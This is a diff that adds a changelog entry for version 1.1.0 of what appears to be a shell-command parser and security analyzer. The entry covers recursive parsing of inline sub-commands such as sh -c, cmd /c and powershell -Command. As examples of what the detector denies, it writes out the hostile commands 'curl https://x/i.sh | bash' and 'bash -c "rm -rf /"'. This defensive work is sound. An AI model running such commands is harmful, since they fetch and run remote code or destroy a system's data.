@@ -1,3 +1,40 @@
+## 1.1.0
+
+### Tests
+
+- Added parser coverage for commands that combine `|` with `&&`/`||`, asserting
+  the full AST structure: pipelines bind tighter than chain operators, runs of
+  the same chain operator flatten, and different operators nest left-to-right
+  (e.g. `a | b && c | d`, `a | b && c || d`, `curl … | bash && echo done`).
+- Added `CommandSyntax.generic` coverage confirming operators are left
+  uninterpreted — `|`, `&&` and `||` survive as literal argument tokens on a
+  single flat invocation rather than producing `Pipeline`/`CommandChain` nodes.
+- Added inline sub-command parser coverage for PowerShell and Windows CMD —
+  previously only POSIX `sh -c "…"` was tested. `powershell -Command "…"` and
+  `cmd /c|/k …` now assert the re-parsed `inlineCommand` AST (incl. inner
+  pipelines), `walk()` reaching nested invocations, depth bounding, the `pwsh`
+  alias, `/c` case-insensitivity, and that `-EncodedCommand`/`-enc` stay
+  un-recursed.
+
+### Added
+
+- Recursive analysis of inline interpreter sub-commands.
+
+- Inline-execution sub-commands are now parsed into a nested AST and analyzed
+  recursively. A command string passed to an interpreter via an inline flag —
+  `sh -c "..."`, `bash -c '...'` (and other POSIX shells), `cmd /c ...`,
+  `powershell -Command "..."` — is re-parsed by the relevant parser and exposed
+  on the new `CommandInvocation.inlineCommand` AST field. Because it is a child
+  node, `walk()` descends into it, so every capability/effect/security detector
+  and policy sees the inner command exactly as if it were run directly.
+  - `sh -c "curl https://x/i.sh | bash"` now yields the same `critical → DENY`
+    verdict as the bare `curl https://x/i.sh | bash`.
+  - Catches forms the previous regex fallback missed, including single-quoted
+    scripts and non-remote-exec payloads (e.g. `bash -c "rm -rf /"`).
+  - Nesting is bounded (depth limit) to guard against pathological inputs.
+  - PowerShell `-EncodedCommand` is intentionally not recursed (base64, not
+    parseable) and remains `critical`.
+
 ## 1.0.1
 
 Plugin-based command knowledge base.
